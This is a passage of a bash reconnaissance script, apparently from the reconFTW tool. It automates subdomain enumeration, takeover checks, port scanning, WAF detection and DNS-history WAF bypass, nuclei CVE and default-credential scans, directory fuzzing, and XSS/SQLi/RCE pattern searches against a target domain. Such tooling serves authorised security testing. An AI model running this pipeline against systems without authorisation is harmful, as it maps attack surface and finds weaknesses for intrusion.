			cat .tmp/*_subs.txt | anew -q .tmp/subs_no_resolved.txt
			deleteOutScoped $outOfScope_file .tmp/subs_no_resolved.txt
			eval shuffledns -d $domain -list .tmp/subs_no_resolved.txt -r $resolvers -t 5000 -o .tmp/subdomains_tmp.txt $DEBUG_STD
			echo $domain | dnsx -silent | anew -q .tmp/subdomains_tmp.txt
			dnsx -retry 3 -silent -cname -resp-only -l .tmp/subdomains_tmp.txt | grep ".$domain$" | anew -q .tmp/subdomains_tmp.txt
			eval dnsx -retry 3 -silent -cname -resp -l subdomains/subdomains.txt -o subdomains/subdomains_cname.txt $DEBUG_STD
			NUMOFLINES=$(cat .tmp/subdomains_tmp.txt | anew subdomains/subdomains.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by dns resolution found in ${runtime}${reset}\n\n"
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function sub_scraping(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBSCRAPING" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Source code scraping subdomain search${reset}\n\n"
			touch .tmp/scrap_subs.txt
			cat subdomains/subdomains.txt | httpx -follow-host-redirects -H "${HEADER}" -status-code -timeout 15 -silent -no-color | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/probed_tmp.txt
			gospider -S .tmp/probed_tmp.txt --js -t 10 -H "${HEADER}" --sitemap --robots -w -r | egrep -o 'https?://[^ ]+' | sed 's/]$//' | unfurl --unique domains | grep ".$domain$" | anew -q .tmp/scrap_subs.txt
			cat .tmp/scrap_subs.txt | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/scrap_subs_resolved.txt $DEBUG_STD
			NUMOFLINES=$(eval cat .tmp/scrap_subs_resolved.txt $DEBUG_ERROR | anew subdomains/subdomains.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by scraping found in ${runtime}${reset}\n\n"
			fi
		else
			if [ "$SUBSCRAPING" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function sub_permut(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBPERMUTE" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Permutations Subdomain Enumeration${reset}\n"
			if [[ $(cat .tmp/subs_no_resolved.txt | wc -l) -le 50 ]]
				then
					eval dnsgen .tmp/subs_no_resolved.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute1_tmp.txt $DEBUG_STD
					eval cat .tmp/permute1_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute1.txt
					eval dnsgen .tmp/permute1.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute2_tmp.txt $DEBUG_STD
					eval cat .tmp/permute2_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute2.txt
					eval cat .tmp/permute1.txt .tmp/permute2.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
				elif [[ $(cat .tmp/subs_no_resolved.txt | wc -l) -le 100 ]]
		  		then
					eval dnsgen .tmp/subs_no_resolved.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute_tmp.txt $DEBUG_STD
					eval cat .tmp/permute_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
				else
					if [[ $(cat subdomains/subdomains.txt | wc -l) -le 50 ]]
						then
							eval dnsgen subdomains/subdomains.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute1_tmp.txt $DEBUG_STD
							eval cat .tmp/permute1_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute1.txt
							eval dnsgen .tmp/permute1.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute2_tmp.txt $DEBUG_STD
							eval cat .tmp/permute2_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute2.txt
							eval cat .tmp/permute1.txt .tmp/permute2.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
						elif [[ $(cat subdomains/subdomains.txt | wc -l) -le 100 ]]
						then
							eval dnsgen subdomains/subdomains.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute_tmp.txt $DEBUG_STD
							eval cat .tmp/permute_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
						else
							printf "\n${bred} Skipping Permutations: Too Much Subdomains${reset}\n\n"
					fi
			fi
			if [ -f ".tmp/permute_subs.txt" ]
			then
				deleteOutScoped $outOfScope_file .tmp/permute_subs.txt
				NUMOFLINES=$(eval cat .tmp/permute_subs.txt $DEBUG_ERROR | anew subdomains/subdomains.txt | wc -l)
			else
				NUMOFLINES=0
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by permutations found in ${runtime}${reset}\n\n"
			fi
		else
			if [ "$SUBPERMUTE" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function subtakeover(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBTAKEOVER" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Subdomain Takeover ${reset}\n\n"
			start=`date +%s`
			touch .tmp/tko.txt
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/takeovers/ -o .tmp/tko.txt
			NUMOFLINES=$(eval cat .tmp/tko.txt $DEBUG_ERROR | anew webs/takeover.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				text="${bred}\n ${NUMOFLINES} new possible takeovers found in ${runtime}${reset}\n\n"
			fi
			printf "${text}" && printf "${text}" | $NOTIFY
			printf "${bblue}\n Subdomain Takeover Finished\n"
			printf "${bblue} Results are saved in webs/takeover.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$SUBTAKEOVER" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

###############################################################################################################
########################################### WEB DETECTION #####################################################
###############################################################################################################

function webprobe_simple(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Http probing${reset}\n\n"
			cat subdomains/subdomains.txt | httpx -follow-host-redirects -H "${HEADER}" -status-code -timeout 15 -silent -no-color | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/probed_tmp.txt
			deleteOutScoped $outOfScope_file .tmp/probed_tmp.txt
			NUMOFLINES=$(eval cat .tmp/probed_tmp.txt $DEBUG_ERROR | anew webs/webs.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				text="${green} ${NUMOFLINES} new websites resolved in ${runtime}${reset}\n\n"
				printf "${text}" && printf "${text}" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function webprobe_full(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$WEBPROBEFULL" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} ${bgreen} Web Probe ${reset}\n\n"
			printf "${yellow} Running : Http probing non standard ports${reset}\n\n"
			start=`date +%s`
			cat subdomains/subdomains.txt | httpx -ports 81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55672 -follow-host-redirects -H "${HEADER}" -status-code -threads 150 -timeout 10 -silent -no-color | cut -d ' ' -f1 | grep ".$domain" | anew -q .tmp/probed_uncommon_ports_tmp.txt
			NUMOFLINES=$(eval cat .tmp/probed_uncommon_ports_tmp.txt $DEBUG_ERROR | anew webs/webs_uncommon_ports.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				text="${bred}\n Uncommon web ports: ${NUMOFLINES} new websites in ${runtime}${reset}\n\n"
				printf "${text}" && printf "${text}" | $NOTIFY
				eval cat webs/webs_uncommon_ports.txt $DEBUG_ERROR
			fi
			printf "${bblue}\n Web Probe Finished\n"
			printf "${bblue} Results are saved in webs/webs_uncommon_ports.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$WEBPROBEFULL" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function screenshot(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$WEBSCREENSHOT" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} ${bgreen} Web Screenshot ${reset}\n\n"
			start=`date +%s`
			python3 $tools/webscreenshot/webscreenshot.py -i webs/webs.txt -r chromium -w 4 -a "${HEADER}" -o screenshots &>/dev/null
			python3 $tools/webscreenshot/webscreenshot.py -i webs/webs_uncommon_ports.txt.txt -r chromium -w 4 -a "${HEADER}" -o screenshots &>/dev/null
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Web Screenshot Finished in ${runtime}\n"
			printf "${bblue} Results are saved in screenshots folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$WEBSCREENSHOT" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

###############################################################################################################
############################################# HOST SCAN #######################################################
###############################################################################################################

function favicon(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$FAVICON" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} FavIcon Hash Extraction ${reset}\n\n"
			start=`date +%s`
			cd $tools/fav-up
			eval python3 favUp.py -w $domain -sc -o favicontest.json $DEBUG_STD
			if [ -f "favicontest.json" ]
			then
				cat favicontest.json | eval jq -r '.found_ips' $DEBUG_ERROR | grep -v "not-found" > favicontest.txt
				sed -i "s/|/\n/g" favicontest.txt
				eval cat favicontest.txt $DEBUG_ERROR
				eval mv favicontest.txt $dir/hosts/favicontest.txt $DEBUG_ERROR
				eval rm favicontest.json $DEBUG_ERROR
			fi
			cd $dir && touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n FavIcon Hash Extraction Finished in ${runtime}\n"
			printf "${bblue} Results are saved in hosts/favicontest.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$FAVICON" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function portscan(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$PORTSCANNER" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Port Scan ${reset}\n\n"
			start=`date +%s`

			for sub in $(cat subdomains/subdomains.txt); do
				echo "$sub $(dig +short a $sub | tail -n1)" | anew -q hosts/subdomains_ips.txt
			done

			eval cat hosts/subdomains_ips.txt $dir/favicontest.txt $DEBUG_ERROR | cut -d ' ' -f2 | egrep -iv "^(127|10|169|172|192)\." | anew -q hosts/ips.txt

			eval cat hosts/ips.txt | cf-check -c $NPROC | egrep -iv "^(127|10|169|172|192)\." | anew -q .tmp/ips_nowaf.txt

			printf "${bblue}\n Resolved IP addresses (No WAF) ${reset}\n\n";
			eval cat .tmp/ips_nowaf.txt $DEBUG_ERROR | sort

			if [ "$PORTSCAN_PASSIVE" = true ] && [ ! -f "${domain}_portscan_passive.txt" ]
			then
				for sub in $(cat .tmp/ips_nowaf.txt); do
					shodan host $sub 2>/dev/null >> hosts/portscan_passive.txt && echo -e "\n\n#######################################################################\n\n" >> hosts/portscan_passive.txt
				done
			fi

			if [ "$PORTSCAN_ACTIVE" = true ]
			then
				eval nmap --top-ports 1000 -sV -n --max-retries 2 -iL .tmp/ips_nowaf.txt -oN hosts/portscan_active.txt $DEBUG_STD
			fi

			#eval cat portscan.txt $DEBUG_ERROR
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			text="${bblue}\n Port scan Finished in ${runtime}${reset}\n"
			printf "${text}" && printf "${text}" | $NOTIFY
			printf "${bblue} Results are saved in portscan_[passive|active].txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$PORTSCANNER" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}


###############################################################################################################
############################################# WEB SCAN ########################################################
###############################################################################################################

function waf_checks(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$WAF_DETECTION" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} ${bgreen} Detecting WAF in websites ${reset}\n\n"
			start=`date +%s`
			wafw00f -i webs/webs.txt -o .tmp/wafs.txt &>/dev/null
			cat .tmp/wafs.txt | sed -e 's/^[ \t]*//' -e 's/ \+ /\t/g' -e '/(None)/d' | tr -s "\t" ";" > webs/webs_wafs.txt
			NUMOFLINES=$(eval cat webs/webs_wafs.txt $DEBUG_ERROR | wc -l)
			text="${bblue}\n ${NUMOFLINES} websites with waf detected ${reset}\n"
			printf "${text}" && printf "${text}" | $NOTIFY
			if [ -s "webs/webs_wafs.txt" ] && [ "$WAF_DNS_BYPASS" = true ]
			then
				printf "${bblue} ${bgreen} Looking for WAF DNS History Bypasses ${reset}\n\n"
				cat webs/webs_wafs.txt | cut -d ";" -f1 > .tmp/waf_subdomains.txt
				bash $tools/bypass-firewalls-by-DNS-history/bypass-firewalls-by-DNS-history.sh -d $domain -l .tmp/waf_subdomains.txt -o webs/webs_wafs_dns_bypass.txt -a
				if [ -s "webs/webs_wafs_dns_bypass.txt" ]
				then
					text="${bblue}\n Found WAF DNS history bypasses, check webs/webs_wafs_dns_bypass.txt ${reset}\n"
					printf "${text}" && printf "${text}" | $NOTIFY
				fi
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n WAF Detecion Finished in ${runtime}\n"
			printf "${bblue} Results are saved in screenshots folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$WAF" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function nuclei_check(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$NUCLEICHECK" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Template Scanning with Nuclei ${reset}\n\n"
			start=`date +%s`
			eval nuclei -update-templates $DEBUG_STD
			mkdir -p nuclei_output
			printf "${yellow} Running : Nuclei Technologies${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/technologies/ -o nuclei_output/technologies.txt;
			printf "${yellow}\n\n Running : Nuclei Tokens${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/exposed-tokens/ -o nuclei_output/tokens.txt;
			printf "${yellow}\n\n Running : Nuclei Exposures${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/exposures/ -o nuclei_output/exposures.txt;
			printf "${yellow}\n\n Running : Nuclei CVEs ${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/cves/ -o nuclei_output/cves.txt;
			printf "${yellow}\n\n Running : Nuclei Default Creds ${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/default-logins/ -o nuclei_output/default_creds.txt;
			printf "${yellow}\n\n Running : Nuclei DNS ${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/dns/ -o nuclei_output/dns.txt;
			printf "${yellow}\n\n Running : Nuclei Panels ${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/exposed-panels/ -o nuclei_output/panels.txt;
			printf "${yellow}\n\n Running : Nuclei Security Misconfiguration ${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/misconfiguration/ -o nuclei_output/misconfigurations.txt;
			printf "${yellow}\n\n Running : Nuclei Vulnerabilites ${reset}\n\n"
			cat webs/webs.txt | nuclei -silent -H "${HEADER}" -t ~/nuclei-templates/vulnerabilities/ -o nuclei_output/vulnerabilities.txt && touch $called_fn_dir/.${FUNCNAME[0]};
			printf "\n\n"
			end=`date +%s`
			getElapsedTime $start $end
			text="${bblue}\n Nuclei Scan Finished in ${runtime}\n"
			printf "${text}" && printf "${text}" | $NOTIFY
			printf "${bblue} Results are saved in nuclei_output folder ${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$NUCLEICHECK" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function fuzz(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$FUZZ" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Directory Fuzzing ${reset}\n"
			printf "${yellow}\n\n Fuzzing subdomains with ${fuzz_wordlist}${reset}\n\n"
			start=`date +%s`
			mkdir -p $dir/fuzzing
			for sub in $(cat webs/webs.txt); do
				printf "${yellow}\n\n Running: Fuzzing in ${sub}${reset}\n"
				sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
				ffuf -mc all -fc 404 -ac -sf -s -H "${HEADER}" -w $fuzz_wordlist -maxtime 900 -u $sub/FUZZ -or -o $dir/fuzzing/${sub_out}.tmp &>/dev/null
				eval cat $dir/fuzzing/${sub_out}.tmp $DEBUG_ERROR | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' ' - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' | sort |anew -q $dir/fuzzing/${sub_out}.txt
				eval rm $dir/fuzzing/${sub_out}.tmp $DEBUG_ERROR
			done
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Directory Fuzzing Finished in ${runtime}\n"
			printf "${bblue} Results are saved in fuzzing/*subdomain*.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$FUZZ" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function cms_scanner(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$CMS_SCANNER" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} CMS Scanner ${reset}\n"
			start=`date +%s`
			mkdir -p $dir/cms && rm -rf $dir/cms/*
			tr '\n' ',' < webs/webs.txt > .tmp/cms.txt
			eval python3 $tools/CMSeeK/cmseek.py -l .tmp/cms.txt --batch -r $DEBUG_STD
			for sub in $(cat webs/webs.txt); do
				sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
				cms_id=$(eval cat $tools/CMSeeK/Result/${sub_out}/cms.json $DEBUG_ERROR | jq -r '.cms_id')
				if [ -z "$cms_id" ]
				then
					rm -rf $tools/CMSeeK/Result/${sub_out}
				else
					mv -f $tools/CMSeeK/Result/${sub_out} $dir/cms/
				fi
			done
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n CMS Scanner finished in ${runtime}\n"
			printf "${bblue} Results are saved in cms/*subdomain* folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$CMS_SCANNER" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function params(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$PARAMS" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Parameter Discovery ${reset}\n"
			start=`date +%s`
			printf "${yellow}\n\n Running : Searching params with paramspider${reset}\n"
			cat webs/webs.txt | sed -r "s/https?:\/\///" | anew -q .tmp/probed_nohttp.txt
			interlace -tL .tmp/probed_nohttp.txt -threads 10 -c "python3 $tools/ParamSpider/paramspider.py -d _target_ -l high -q --exclude eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt,js" &>/dev/null
			eval cat output/*.txt $DEBUG_ERROR | anew -q .tmp/param_tmp.txt
			sed '/^FUZZ/d' -i .tmp/param_tmp.txt
			eval rm -rf output/ $DEBUG_ERROR
			if [ "$DEEP" = true ] ; then
				printf "${yellow}\n\n Running : Checking ${domain} with Arjun${reset}\n"
				eval arjun -i .tmp/param_tmp.txt -t 20 -oT webs/param.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
			else
				if [[ $(cat .tmp/param_tmp.txt | wc -l) -le 50 ]]
				then
					printf "${yellow}\n\n Running : Checking ${domain} with Arjun${reset}\n"
					eval arjun -i .tmp/param_tmp.txt -t 20 -oT webs/param.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
				else
					cp .tmp/param_tmp.txt webs/param.txt && touch $called_fn_dir/.${FUNCNAME[0]}
				fi
			fi
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Parameter Discovery Finished in ${runtime}\n"
			printf "${bblue} Results are saved in webs/param.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$PARAMS" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
				printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
			fi
	fi
}

function urlchecks(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} URL Extraction ${reset}\n\n"
			start=`date +%s`
			mkdir -p js
			cat webs/webs.txt | waybackurls | anew -q .tmp/url_extract_tmp.txt
			cat webs/webs.txt | gau | anew -q .tmp/url_extract_tmp.txt
			if [ "$DEEP" = true ] ; then
				gospider -S webs/webs.txt --js -t 10 -d 3 -H "${HEADER}" --sitemap --robots -w -r | egrep -o 'https?://[^ ]+' | sed 's/]$//' | grep ".$domain$" | anew -q .tmp/url_extract_tmp.txt
			else
				gospider -S webs/webs.txt --js -t 10 -H "${HEADER}" --sitemap --robots -w -r | egrep -o 'https?://[^ ]+' | sed 's/]$//' | grep ".$domain$" | anew -q .tmp/url_extract_tmp.txt
			fi
			if [ -s "${GITHUB_TOKENS}" ]
			then
				eval github-endpoints -q -k -d $domain -t ${GITHUB_TOKENS} -raw $DEBUG_ERROR | anew -q .tmp/url_extract_tmp.txt
			fi
			eval cat .tmp/url_extract_tmp.txt webs/param.txt $DEBUG_ERROR | grep "${domain}" | grep "=" | eval qsreplace -a $DEBUG_ERROR | egrep -iv "\.(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|pdf|svg|txt|js)" | anew -q .tmp/url_extract_tmp2.txt
			cat .tmp/url_extract_tmp.txt | grep "${domain}" | egrep -i "\.(js)" | anew -q js/url_extract_js.txt
			eval uddup -u .tmp/url_extract_tmp2.txt -o .tmp/url_extract_uddup.txt $DEBUG_STD
			NUMOFLINES=$(eval cat .tmp/url_extract_uddup.txt $DEBUG_ERROR | anew webs/url_extract.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]};
			end=`date +%s`
			getElapsedTime $start $end
			text="${bblue}\n URL Extraction Finished\n"
			printf "${text}" && printf "${text}" | $NOTIFY
			if [ "$NUMOFLINES" -gt 0 ]; then
				text="${bblue}\n ${NUMOFLINES} new urls in ${runtime}\n"
				printf "${text}" && printf "${text}" | $NOTIFY
			fi
			printf "${bblue} Results are saved in webs/url_extract.txt${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function url_gf(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$URL_GF" = true ]
		then
			printf "${bgreen}#######################################################################\n"
			printf "${bblue} Vulnerable Pattern Search ${reset}\n\n"
			start=`date +%s`
			mkdir -p gf
			gf xss webs/url_extract.txt | anew -q gf/xss.txt
			gf ssti webs/url_extract.txt | anew -q gf/ssti.txt
			gf ssrf webs/url_extract.txt | anew -q gf/ssrf.txt
			gf sqli webs/url_extract.txt | anew -q gf/sqli.txt
			gf redirect webs/url_extract.txt | anew -q gf/redirect.txt && cat gf/ssrf.txt | anew -q gf/redirect.txt
			gf rce webs/url_extract.txt | anew -q gf/rce.txt
			gf potential webs/url_extract.txt | cut -d ':' -f3-5 |anew -q gf/potential.txt
			cat webs/url_extract.txt | unfurl -u format %s://%d%p | anew -q gf/endpoints.txt
			gf lfi webs/url_extract.txt | anew -q gf/lfi.txt
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			printf "${bblue}\n Vulnerable Pattern Search Finished in ${runtime}\n"
			printf "${bblue} Results are saved in gf folder${reset}\n"
			printf "${bgreen}#######################################################################\n\n"
		else
			if [ "$URL_GF" = false ]; then
				printf "${yellow} ${FUNCNAME[0]} skipped because is set to false in reconftw.cfg ${reset}\n\n"
			else
